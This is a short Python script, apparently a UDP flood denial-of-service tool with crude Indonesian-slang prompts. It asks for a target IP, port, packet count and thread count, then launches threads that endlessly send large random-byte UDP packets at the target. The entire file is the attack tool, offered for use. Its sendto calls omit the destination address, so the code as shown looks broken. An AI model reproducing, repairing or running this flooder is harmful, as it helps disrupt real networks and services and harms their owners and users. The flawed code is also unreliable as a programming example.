import random
import socket
import threading
import os,sys

os.system("clear")
print("hengker disini")

p1 = str(input("IP BG GANTENG  : "))
p2 = int(input("PORT BG GANTENG  : "))
p3 = int(input("PAKET GANTENG : "))
p4 = int(input("BONUS PAKETAN : "))
os.system("clear")
def titid():
    pepek = random._urandom(1180)        
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.sendto(pepek)
            for x in range(p3):
                s.sendto(pepek)
            print("gabut anjg yah nembus")
        except:
            print("Down hmm!!!")

def titid2():
    pepek = random._urandom(1800)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.sendto(pepek)
            for x in range(p3):
                s.sendto(pepek)
            print("gabut anjg yah nembus")
        except:
            print("Down hmm!!!")

def titid3():
    pepek = random._urandom(1900)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.sendto(pepek)
            for x in range(p3):
                s.sendto(pepek)
            print("gabut anjg yah nembus")
        except:
            print("Down hmm!!!")
            
for y in range(p4):
    th = threading.Thread(target=titid)
    th.start()
    th = threading.Thread(target=titid2)
    th.start()
    th = threading.Thread(target=titid3)
    th.start() 

